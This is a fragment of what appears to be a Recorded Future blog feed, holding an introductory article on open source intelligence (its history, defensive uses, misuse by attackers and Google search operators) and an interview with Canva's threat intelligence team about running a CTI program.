<strong>some of the most commonly used (and abused) open source intelligence tools are search engines like Google</strong>  just not as most of us know them.</p><p>As weve already explained, <strong>one of the biggest issues facing security professionals is the regularity with which normal, well-meaning users accidentally leave sensitive assets and information exposed to the internet</strong>. There are a series of advanced search functions called <a href=\"https://recordedfuture.com/threat-intelligence-101/threat-analysis-techniques/google-dorks\">Google dork</a> queries that can be used to identify the information and assets they expose.</p><p>Google dork queries are based on the search operators used by IT professionals and hackers on a daily basis to conduct their work. Common examples include filetype:, which narrows search results to a specific file type, and site:, which only returns results from a specified website or domain.</p><p>The Public Intelligence website offers a <a href=\"https://publicintelligence.net/feds-google-dorking\">more thorough rundown of Google dork queries</a>, in which they give the following example search:</p><p><em>sensitive but unclassified filetype:pdf site:publicintelligence.net</em></p><p>If you type this search term into a search engine, it returns only PDF documents from the <a href=\"http://publicintelligence.net/\">Public Intelligence website</a> that contain the words sensitive but unclassified somewhere in the document text. As you can imagine, with hundreds of commands at their disposal, security professionals and threat actors can use similar techniques to search for almost anything.</p><p>Moving beyond search engines, there are literally hundreds of tools that can be used to identify network weaknesses or exposed assets. For example, you can use<a href=\"https://wappalyzer.com/\"> Wappalyzer</a> to identify which technologies are used on a website, and combine the results with<a href=\"https://sploitus.com/\"> Sploitus</a> or the <a href=\"https://nvd.nist.gov/\">National Vulnerability Database</a> to determine whether any relevant vulnerabilities exist. Taking things a step further, you could use a more advanced threat intelligence solution like Recorded Future to determine whether any <a href=\"https://www.recordedfuture.com/vulnerability-database\">recent vulnerabilities</a> are being actively exploited, or included in any active exploit kits.</p><h2 id=\"osint-faq\">OSINT FAQ</h2><h3 id=\"is-osint-legal\">Is OSINT legal?</h3><p>Yes, OSINT is generally legal since it involves <a href=\"https://recordedfuture.com/threat-intelligence-101/intelligence-sources-collection/information-gathering\">gathering information</a> that is publicly available. However, the legality can become a gray area depending on how the information is used or if attempts are made to access restricted or private data under the guise of OSINT. It is crucial to ensure that while gathering information, sensitive data is protected to prevent it from being exploited by attackers.</p><h3 id=\"what-is-the-dark-side-of-osint\">What is the dark side of OSINT?</h3><p>The dark side of OSINT emerges when sensitive data is gathered and misused for malicious purposes. This can include stalking, harassment, doxxing, or even planning cyber-attacks. While OSINT itself is a valuable tool for many positive uses, like any tool, it can be misused in the wrong hands.</p><h3 id=\"how-is-osint-utilized-to-gather-intelligence-from-the-dark-web-and-what-precautions-should-be-taken\">How is OSINT utilized to gather intelligence from the dark web, and what precautions should be taken?</h3><p>OSINT is employed to uncover hidden services and forums on the dark web, aiding in <a href=\"https://www.recordedfuture.com/threat-intelligence-101/incident-response-management/cyber-crime-investigation\">cybercrime investigations</a> or threat detection. The use of OSINT tools, such as Spiderfoot and Twint, is crucial in uncovering and analyzing data from these hidden sources. However, venturing into the dark web requires precautions:</p><ol><li><strong>Legal Compliance:</strong> Ensure actions comply with legal and ethical guidelines.</li><li><strong>Privacy Protection:</strong> Avoid infringing on individual privacy.</li><li><strong>Secure Browsing:</strong> Use tools like Tor for secure browsing.</li><li><strong>Malware Protection:</strong> Employ robust malware protection to guard against malicious software.</li><li><strong>Data Verification:</strong> Verify the accuracy of the information collected through multiple sources.</li></ol><p>These measures help ensure the safe and lawful use of OSINT in gathering intelligence from the dark web.</p><h2 id=\"start-with-the-end-in-mind\">Start With the End in Mind</h2><p>The most important factor in the success of any open source intelligence initiative is the presence of a clear strategy  once you know what youre trying to accomplish and youve set objectives accordingly, identifying the most useful tools and techniques will be much more achievable.</p><p>To learn more about how Recorded Future can help organizations better understand and prevent threats, <a href=\"https://go.recordedfuture.com/demo?utm_campaign=rf-blog-bottom-book-a-demo-text-cta&utm_source=recordedfuture&utm_medium=webiste&utm_content=rf-blog-bottom-book-a-demo-text-cta&utm_term=rf-blog-bottom-book-a-demo-text-cta\">request a personalized demo</a> today.</p><p><em>This article was originally published February 19, 2019, and last updated on Jun 24, 2024.</em></p>","content:encodedSnippet":"Open Source Intelligence (OSINT) is the practice of gathering, analyzing, and disseminating information from publicly available sources to address specific intelligence requirements.\nOf all the threat intelligence subtypes, open source intelligence (OSINT) is perhaps the most widely used, which makes sense.

Despite this, much of the content of the deep web can be considered open source because its readily available to the public.\nOSINT tools can be used to access and analyze information from sources beyond traditional search engines. These tools, such as Spiderfoot, searchcode, Searx, Twint, and Metagoofil, gather and analyze massive amounts of data from public and open sources, including social media networks and the deep web, to discover and store large quantities of data, find links and patterns among different pieces of information, and collate discovered information into actionable intelligence.\nIn addition, theres plenty of freely accessible information online that can be found using online tools other than traditional search engines. Well look at this more later on, but as a simple example, tools like SecurityTrails and others can be used to find IP addresses, networks, open ports, webcams, printers, and pretty much anything else thats connected to the internet.\nInformation can also be considered open source if it is:\n\nPublished or broadcast for a public audience (for example, news media content)\nAvailable to the public by request (for example, census data)\nAvailable to the public by subscription or purchase (for example, industry journals)\nCould be seen or heard by any casual observer\nMade available at a meeting open to the public\nObtained by visiting any place or attending any event that is open to the public\n\nAt this point, youre probably thinking, Man, thats a lot of information \nAnd youre right. Were talking about a truly unimaginable quantity of information that is growing at a far higher rate than anybody could ever hope to keep up with. Even if we narrow the field down to a single source of information  lets say Twitter  were forced to cope with hundreds of millions of new data points every day.\nThis, as youve probably gathered, is the inherent trade-off of open source intelligence.\nHistory of OSINT\nThe term OSINT refers to the practice of collecting information from publicly available sources to be used in an intelligence context. This practice has been around for a while, but its the digital era that really propelled OSINT into a league of its own.\nThe foundational roots of OSINT are linked to the formation of the Foreign Broadcast Monitoring Service (FBMS) back in 1941. This organization was charged with the significant role of scrutinizing international broadcast communications to identify any potential dubious activities.\nAccording to the Association of Former Intelligence Officers (AFIO): The US military first coined the term OSINT in the late 1980s. This development stemmed from the recognition that intelligence reform was needed to effectively meet the rapidly changing informational demands, particularly at the tactical battlefield level.\nInitially, OSINT was a tool used primarily by intelligence agencies and law enforcement to gather publicly available information to assist in national security and cybercriminal investigations. The methods involved were time-consuming, often requiring individuals to manually sift through public records, newspapers, and other documents to find relevant information. This manual gathering of information was often difficult due to the vast amount of data one had to sift through. However, as the web evolved, so did the methods of collecting and analyzing publicly available data.\nThe advent of the internet significantly amplified the means through which information could be collected. Suddenly, a wide range of data became publicly available and easily accessible online, from government reports to academic papers, and everything in-between. Websites became a primary data source for OSINT practitioners. These developments led to a boom in the creation of OSINT tools designed to automate the process of data collection and analysis. These tools could quickly gather information from various sources, including publicly accessible databases, social media platforms, and many other tools available in the digital realm.\nAs the field of cybersecurity experienced rapid growth, the application of OSINT expanded. Cybersecurity professionals began to see the value in utilizing OSINT to identify vulnerabilities, assess potential security threats, and bolster organizational security. OSINT tools became essential in monitoring publicly accessible web servers, analyzing metadata, and assessing security vulnerabilities. The data gathered became invaluable in understanding the security posture of an organization, identifying potential threats, and developing strategies to mitigate risks.\nOne notable trend is the integration of machine learning and analytics in OSINT tools to enhance the process of identifying patterns and trends from the collected data. This integration has not only made OSINT tools more effective but has also expanded the range of applications in which they can be utilized. For instance, security researchers now use OSINT to perform penetration tests, while businesses use it to gain insights into their competitors and the market environment.\nMoreover, the community of OSINT researchers has grown over time, with forums, conferences, and groups forming to share knowledge, discuss best practices, and develop new OSINT techniques. Many OSINT tools, including frameworks like Recon-ng, have communities of developers on platforms like GitHub, working to improve, customize, and create modules to extend the capabilities of these tools. The collective effort of these communities has played a significant role in refining the OSINT practice, making it a vital component in intelligence gathering and cybersecurity.\nHow Is Open Source Intelligence Used?\nNow that weve covered the basics of open source intelligence, we can look at how it is commonly used for cybersecurity. The intelligence community plays a crucial role in utilizing OSINT for national security and cybersecurity efforts. \n\n\n\nThere are two common use cases:\n1. Ethical Hacking and Penetration Testing\nSecurity professionals use open source intelligence to identify potential weaknesses in friendly networks so that they can be remediated before they are exploited by threat actors. Commonly found weaknesses include:\n\nAccidental leaks of sensitive data, like through social media. Identifying and protecting sensitive data is crucial to reduce the risk of cybersecurity threats.\nOpen ports or unsecured internet-connected devices\nUnpatched software, such as websites running old versions of common CMS products\nLeaked or exposed assets, such as proprietary code on pastebins\n\n2. Identifying External Threats\nAs weve discussed many times in the past, the internet is an excellent source of insights into an organizations most pressing emerging threats. From identifying which new vulnerabilities are being actively exploited to intercepting threat actor chatter about an upcoming attack, open source intelligence enables security professionals to prioritize their time and resources to address the most significant current threats.\nIn most cases, this type of work requires an analyst to identify and correlate multiple data points to validate a threat before action is taken. OSINT tools are used to gather and analyze data from public and open sources, including social media networks and the deep web, to identify and correlate multiple data points for threat validation. For example, while a single threatening tweet may not be cause for concern, that same tweet would be viewed in a different light if it were tied to a threat group known to be active in a specific industry.\nOne of the most important things to understand about open source intelligence is that it is often used in combination with other intelligence subtypes. Intelligence from closed sources such as internal telemetry, closed dark web communities, and external intelligence-sharing communities is regularly used to filter and verify open source intelligence. There are a variety of tools available to help analysts perform these functions, which well look at a bit later on.\nThe Dark Side of Open Source Intelligence\nAt this point, its time to address the second major issue with open source intelligence: if something is readily available to intelligence analysts, its also readily available to threat actors.\nThreat actors use open source intelligence tools and techniques to identify potential targets and exploit weaknesses in target networks. Once a vulnerability is identified, it is often an extremely quick and simple process to exploit it and achieve a variety of malicious objectives. They also seek out sensitive data that can be exploited for malicious purposes, such as launching targeted attacks or selling the information on the dark web.\nThis process is the main reason why so many small and medium-sized enterprises get hacked each year. It isnt because threat groups specifically take an interest in them, but rather because vulnerabilities in their network or website architecture are found using simple open source intelligence techniques. In short, they are easy targets.\nAnd open source intelligence doesnt only enable technical attacks on IT systems and networks. Different types of threat actors also seek out information about individuals and organizations that can be used to inform sophisticated social engineering campaigns using phishing (email), vishing (phone or voicemail), and SMiShing (SMS). Often, seemingly innocuous information shared through social networks and blogs can be used to develop highly convincing social engineering campaigns, which in turn are used to trick well-meaning users into compromising their organizations network or assets.\nThis is why using open source intelligence for security purposes is so important  It gives you an opportunity to find and fix weaknesses in your organizations network and remove sensitive information before a threat actor uses the same tools and techniques to exploit them.\nOpen Source Intelligence Techniques and OSINT Tools\nNow that weve covered the uses of open source intelligence (both good and bad) its time to look at some of the techniques that can be used to gather and process open source information.\n\n\n\nFirst, you must have a clear strategy and framework in place for acquiring and using open source intelligence. Its not recommended to approach open source intelligence from the perspective of finding anything and everything that might be interesting or useful  as weve already discussed, the sheer volume of information available through open sources will simply overwhelm you.\nIt is also crucial to select the right OSINT tool for your specific intelligence gathering goals. These tools, such as Spiderfoot, searchcode, Searx, Twint, and Metagoofil, can help discover and store large quantities of data, find links and patterns among different pieces of information, and collate discovered information into actionable intelligence.\nInstead, you must know exactly what youre trying to achieve  for example, to identify and remediate weaknesses in your network  and focus your energies specifically on accomplishing those goals.\nSecond, you must identify a set of tools and techniques for collecting and processing open source information. Once again, the volume of information available is much too great for manual processes to be even slightly effective.\nPassive vs. Active OSINT\nBroadly speaking, collection of open source intelligence falls into two categories: passive collection and active collection.\nPassive collection often involves the use of threat intelligence platforms (TIPs) to combine a variety of threat feeds into a single, easily accessible location. While this is a major step up from manual intelligence harvesting, the risk of information overload is still significant.\nMore advanced threat intelligence solutions like Recorded Future solve this problem by using artificial intelligence, machine learning, and natural language processing to automate the process of prioritizing and dismissing alerts based on an organizations specific needs. Additionally, using an OSINT tool can further streamline this process by gathering and analyzing massive amounts of data from public and open sources, including social media networks and the deep web.\nIn a similar manner, organized threat groups often use botnets to collect valuable information using techniques like traffic sniffing and keylogging.\nActive collection is the use of a variety of techniques to search for specific insights or information. For security professionals, this type of collection work is usually done for one of two reasons:\n\nA passively collected alert has highlighted a potential threat and further insight is required.\nThe focus of an intelligence gathering exercise is very specific, such as a penetration testing exercise.\n\nTo close things out, well take a look at some of the most commonly used tools for collecting and processing open source intelligence.\nWhile there are many free and useful tools available to security professionals and threat actors alike, some of the most commonly used (and abused) open source intelligence tools are search engines like Google  just not as most of us know them.\nAs weve already explained, one of the biggest issues facing security professionals is the regularity with which normal, well-meaning users accidentally leave sensitive assets and information exposed to the internet. There are a series of advanced search functions called Google dork queries that can be used to identify the information and assets they expose.\nGoogle dork queries are based on the search operators used by IT professionals and hackers on a daily basis to conduct their work. Common examples include filetype:, which narrows search results to a specific file type, and site:, which only returns results from a specified website or domain.\nThe Public Intelligence website offers a more thorough rundown of Google dork queries, in which they give the following example search:\nsensitive but unclassified filetype:pdf site:publicintelligence.net\nIf you type this search term into a search engine, it returns only PDF documents from the Public Intelligence website that contain the words sensitive but unclassified somewhere in the document text. As you can imagine, with hundreds of commands at their disposal, security professionals and threat actors can use similar techniques to search for almost anything.\nMoving beyond search engines, there are literally hundreds of tools that can be used to identify network weaknesses or exposed assets. For example, you can use Wappalyzer to identify which technologies are used on a website, and combine the results with Sploitus or the National Vulnerability Database to determine whether any relevant vulnerabilities exist. Taking things a step further, you could use a more advanced threat intelligence solution like Recorded Future to determine whether any recent vulnerabilities are being actively exploited, or included in any active exploit kits.\nOSINT FAQ\nIs OSINT legal?\nYes, OSINT is generally legal since it involves gathering information that is publicly available. However, the legality can become a gray area depending on how the information is used or if attempts are made to access restricted or private data under the guise of OSINT. It is crucial to ensure that while gathering information, sensitive data is protected to prevent it from being exploited by attackers.\nWhat is the dark side of OSINT?\nThe dark side of OSINT emerges when sensitive data is gathered and misused for malicious purposes. This can include stalking, harassment, doxxing, or even planning cyber-attacks. While OSINT itself is a valuable tool for many positive uses, like any tool, it can be misused in the wrong hands.\nHow is OSINT utilized to gather intelligence from the dark web, and what precautions should be taken?\nOSINT is employed to uncover hidden services and forums on the dark web, aiding in cybercrime investigations or threat detection. The use of OSINT tools, such as Spiderfoot and Twint, is crucial in uncovering and analyzing data from these hidden sources. However, venturing into the dark web requires precautions:\n\nLegal Compliance: Ensure actions comply with legal and ethical guidelines.\nPrivacy Protection: Avoid infringing on individual privacy.\nSecure Browsing: Use tools like Tor for secure browsing.\nMalware Protection: Employ robust malware protection to guard against malicious software.\nData Verification: Verify the accuracy of the information collected through multiple sources.\n\nThese measures help ensure the safe and lawful use of OSINT in gathering intelligence from the dark web.\nStart With the End in Mind\nThe most important factor in the success of any open source intelligence initiative is the presence of a clear strategy  once you know what youre trying to accomplish and youve set objectives accordingly, identifying the most useful tools and techniques will be much more achievable.\nTo learn more about how Recorded Future can help organizations better understand and prevent threats, request a personalized demo today.\nThis article was originally published February 19, 2019, and last updated on Jun 24, 2024.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/what_is_osint_open_source_intelligence_772d788b17.webp","length":"0","type":"image/webp"},"content":"Open Source Intelligence (OSINT) involves gathering, analyzing, and disseminating information from publicly available sources to meet specific intelligence needs.

Then I decided that I wanted a more secure  pun intended  career path that didnt hinge on my creative output. I sub-majored in network security in university and took a chance on a cybersecurity graduate position, which I really ended up liking. Ive kind of been doing both ever since. </p><h3 id=\"whats-your-role-at-canva\">Whats your role at Canva?</h3><p>(Zito) I lead the Cyber Threat Intelligence (CTI) team. Since starting in this industry, I have tried a little bit of everything  incident response, security engineering, vulnerability management. Eventually, I settled on specializing in CTI and have been doing that ever since.</p><p>When I joined Canva, the role was actually to help build out the detection and response capability. While interviewing, I had some candid discussions with the head of security at the time, and we both agreed it didnt make sense for there to be any dedicated CTI capability without a mature detection and response team first. Theres honestly no point in threat intelligence if theres no way to action it, and to do that you need a solid incident response team as your foundation. Imagine flipping over all these rocks and theres no-one around to deal with the spiders!</p><p>After a year or two, we felt we were ready to build out a CTI program, which weve done from scratch.  While weve made a huge amount of progress, were still a very lean team and Im still on a bit of everything train: I engineer our collections, automation and intelligence sharing infrastructure; maintain intelligence requirements and alerting use cases; still tag-team on incidents where intelligence analysis can benefit; and design ways for strategic threat intelligence to make its way to the right areas of the business.</p><h3 id=\"to-bianca-forbes-how-did-you-get-started-in-cybersecurity-and-what-is-your-role-at-canva\">(To Bianca Forbes) How did you get started in cybersecurity? And what is your role at Canva?</h3><p>(Bianca Forbes) I actually started out in penetration testing, which I did for three years, before moving into cyber threat intelligence. When I first got into CTI, I didnt know much about it. After getting thrown in the deep end, I came to really enjoy researching and tracking adversaries as well as the contacts in the intelligence community that I made. Ive been doing it ever since.</p><p>At Canva, I help run the CTI program with Jasmina. I focus primarily on intelligence operations: tracking adversaries, reporting on trends in the threat landscape, providing analysis expertise in investigations, and crafting threat hunting packages.</p><h3 id=\"how-did-you-get-buy-in-for-building-a-cyber-threat-intelligence-cti-program-why-should-other-companies-consider-investing-in-threat-intelligence\">How did you get buy-in for building a Cyber Threat Intelligence (CTI) program? Why should other companies consider investing in threat intelligence?</h3><p>(Zito) To use an industry buzzword  CTI really helps security teams shift left. Traditionally, without CTI, you may be detecting and responding to threats using only the information you have from within your own network. Youre looking for something bad but youre not always sure what, how, or when. </p><p><strong>In my mind, once you detect a threat, you&#39;ve already got it in your environment. Its too late. It&#39;s already happened.</strong></p><p>I think what really helped me get buy-in was to actually start producing CTI products to showcase their value. At the heart of it, the value of threat intelligence is influencing: you use your deliverables to convince the business to do something, whether its investing in a capability, changing the way something is done, or paying more attention to an identified risk. </p><p>You obviously have to start small and be very curated when you dont have dedicated resources. Ive seen it go wrong when emerging teams simply rehash the news or flick on all the threat feeds, which causes a lot of frustration for the people who have to do extra work as a result of the onslaught of new, incoming information. You have to start somewhere but you also have to know what you want out of it all. This is where threat modeling can help. Understanding your organizations crown jewels and what the risks are (your intelligence requirements) helps you be more strategic about where to start.</p><p>In my talk at Recorded Future Predict23 in Singapore, I mentioned a few tips based on lessons learned over time.</p><p><strong>Tip #1:</strong> Instead of sending out daily security news summaries to a mailing list, try referencing a security report in an action item sent directly to the team who can remediate a specific security risk. </p><p>Being that filter between all the sensationalized articles and what your organization actually needs to action helped us build rapport and trust between teams. If you meet your peers halfway, actually read the report and try to make a call on what needs to be done and by whom, youve reduced a lot of mental labor for everyone involved. An added bonus is that you subconsciously train folks to pay attention to when you send them something, otherwise I wager pretty strongly that those daily digests are going to end up in the junk pile a lot of the time.</p><p><strong>Tip #2:</strong> Instead of turning on threat intelligence modules and data feeds in all of your security tools, try only ingesting high-fidelity observables that directly map to a threat youre concerned about. </p><p>That doesnt mean you need to intentionally miss out on a bunch of data during collections. Something Bianca and I have built out is kind of like a tier-based system. All of the observables from our commercial and open source come into the threat intelligence platform (TIP), and they actually all go to the SIEM as well, but that doesnt mean they all are treated the same way. The bulk, raw data is used for enrichment and historical referencing. Then, as part of our usual operational cadence, we will research and validate a subset of observables that meet our intelligence requirements. </p><p>Based on our research, well add extra context and metadata to those observables and intentionally mark them as curated so that they become active in our security tools and can be used in detection or prevention rules. This way, we combat the perception that CTI is just a stream of low-fidelity observables that cause a lot of noise and alert fatigue. </p><p>Once we had that foundation of trust and confidence in the value and fidelity of the curated data, we could then weigh in on the detection engineering process by providing expertise on what metadata can be used  out of the remaining uncurated observable data  to satisfy specific detection use cases.</p><h3 id=\"as-youre-putting-together-your-cyber-threat-intelligence-function-what-kind-of-information-is-needed\">As you&#39;re putting together your Cyber Threat Intelligence function, what kind of information is needed?</h3><p>(Zito) Once you&#39;ve got your intelligence requirements  pick three to start off with and then work back from there you could ask yourself:</p><ul><li>What information do I need to answer those questions? </li><li>Is it open source information? Is it commercial intelligence? A mixture of both?</li><li>What data do I need?  How will I then consume that data? </li><li>Do I have a threat intelligence platform?</li></ul><p>You need to figure out where you&#39;re going to put all of that information, and understand whether you have the technical capability to actually manage all of that infrastructure yourself. If you&#39;re a small team and you don&#39;t have a lot of engineering resources, maybe you&#39;ll actually start off with something commercial and buy instead of build so you dont have to think about managing infrastructure and can instead focus on actual analysis.</p><p>It can be tempting to get started using open source tooling. I love that theres passionate people out there collectively building free tools to help with CTI operations. I would be cautious here about the time and skills needed to maintain some of these systems, as they can require a bit of TLC and jerry-rigging. Again, starting small and being intentional about your desired outcome is your best shot at incremental success.</p><p>When it comes to people, there are a lot of varying skills among CTI practitioners. For example, because of Bianca&#39;s pentesting background, shes very technically proficient and good at researching how adversary TTPs evolve; and there are other folks who specialize in what I would call more traditional intelligence analysis. It really just depends on your organization and what&#39;s going to work best to satisfy your intelligence requirements.  </p><p>If, like Canva, your organization is tech and software-centric, maybe its important you have people with the technical ability to understand how the latest obscure exploit could actually impact you, if at all. Whereas, if you are in critical infrastructure, maybe you need a bit more of that geopolitical background to help you understand which APT groups are a threat to your organization by understanding why somebody would try to come after critical infrastructure in the first place. </p><h3 id=\"how-do-you-think-about-connecting-your-people-tools-and-workflows\">How do you think about connecting your people, tools and workflows?</h3><p>(Zito) If you think about the teams consuming your intelligence products as customers, you need to understand their ways of working, their pain points, and what they need from you to support them. I usually pick one customer at a time, and pilot a workflow end-to-end based after sitting down with them and understanding <strong><em>their</em></strong> requirements.</p><p>If youre into games, pretend this is a role-playing game (RPG) and youre the support class. Your job is throwing heals and buffs. Youre likely not on the front lines in the heat of the battle, so its not really fair if you insist on calling all the shots.</p><p>If you use your blue team / SOC as an example first customer, they very likely have their own tooling for detections, their own case management system to house investigations and incidents, and their own internal comms channels. Nobody wants to receive an email with an attached report that has a bunch of random observables listed at the end in no particular format, that they then have to manually put into a system. What a waste of time!</p><p>When you talk to your blue team, you may learn that if they could have anything they wanted, it would be for someone to do all that for them and to not have to think about it. Theres no real reason they need to read a report for the threat to be blocked. If they need context, theyll be able to find it <strong>if</strong> an alert ever triggers. </p><p>Unfortunately, we (CTI) really dont want to be copy-paste robots either. So we automate. In cases where the analysis has already been done and all we need to do is block some hashes or C2 IPs, why does anyone have to be involved in the process? CTI should be able to click a button to validate an observable, and based on metadata, it goes where it needs to go. Thats essentially what we ended up building. </p><p>And that actually means now that when an intelligence report is published, its much more likely to be read, because the last one wasnt just a day ago. <strong>We want people to feel confident that silence from us equals no threat to worry about.</strong></p><p>(Forbes) A good example of an integrated workflow with Recorded Future is how we develop threat hunting packages. Our team is continually tracking trends in the threat landscape and we have processes to help us identify what is relevant to us. Reflecting back on the idea behind the tier-based system we have for observables, we consume all of the threat hunting packages Recorded Future publishes. Once we identify a threat trend we want to hunt for, we can use the relevant ingested packages as a building block for the final deliverable. Its especially helpful considering they come with YARA rules and TTPs, so it reduces some of the manual work we have to do. </p><p>Once a hunting package is developed, weve built an automated message that sends all the relevant information to the threat hunting team, again, integrating with their workflow and tooling. Another benefit of working closely with our customers when designing integrations is we can get valuable feedback about the outcomes of our intelligence products.</p><p>Another example workflow is how we mitigate risks associated with our supply chain vendors. By populating our suppliers watch list within Recorded Future, we can then look for things like who&#39;s attacking our suppliers. An example would be if one of our critical vendors has been posted on a ransomware blog site. Oftentimes we&#39;ll learn about that through Recorded Future before the vendor even reaches out and says, Hey, we&#39;ve had an incident. Yeah, we know we&#39;ve been watching. Recorded Future allows us to get on the front foot in those types of situations.</p><h3 id=\"how-do-you-showcase-the-value-that-youre-bringing-to-the-rest-of-the-security-organization-and-to-the-rest-of-the-company\">How do you showcase the value that youre bringing to the rest of the security organization? And to the rest of the company?</h3><p>(Zito) We track the fidelity of our deliverables by showing how much information and data we consume and how much of that turned into some kind of action. </p><p>For example, if we pulled in 100 threat reports; shortlisted 20 based on the topic meeting our intelligence requirements; and only 3 turned into an internal threat bulletin with recommended actions - thats actually a good thing. It shows that we filtered and curated information really well before it got on anyones to-do list.</p><p>It doesnt stop at recommendations or information shared, though. We also want to know how much of the work we have generated for other teams resulted in something useful. If we published a threat hunting package and no malicious activity was uncovered, thats great. But what else did we discover? Were there any new detection ideas as a result? Is there any additional telemetry that we could monitor? </p><p>When we&#39;re talking about showing value to the broader organization, it&#39;s really about taking the macro trends from all of those metrics and surfacing it into high level insights. Imagine if you started out thinking malware was your biggest threat because thats what your industrys threat landscape is telling you. </p><p>Once you start collecting data about the outcomes of your intelligence products  What category of observables triggered the most alerts? How many threat bulletins resulted in a security investigation and subsequent uplift, and in what areas? </p><p>You may learn your biggest threat is something entirely different. Or, if you dont, at least the data validates your current assessment. Either way, this can help you drive your overall security strategy by supporting continued investment into existing focus areas or highlighting areas that may need more attention.</p>","content:encodedSnippet":"To learn more about the Threat Intelligence practitioners utilizing Recorded Future, we sat down with Jasmina Zito and Bianca Forbes, who run the Cyber Threat Intelligence team at Canva. \nThis wide-ranging discussion talks through how they got into their current roles, recommendations for getting buy-in for a CTI program, and how to showcase value to the rest of the organization.\nMeet the Canva Cyber Threat Intelligence Team:\nJasmina Zito, Senior Cyber Threat Intelligence Specialist \nBianca Forbes, Senior Cyber Threat Intelligence Specialist \n(Recorded Future) How did you find yourself in a cybersecurity role?\n(Jasmina Zito) I started out as a digital artist and a games developer.
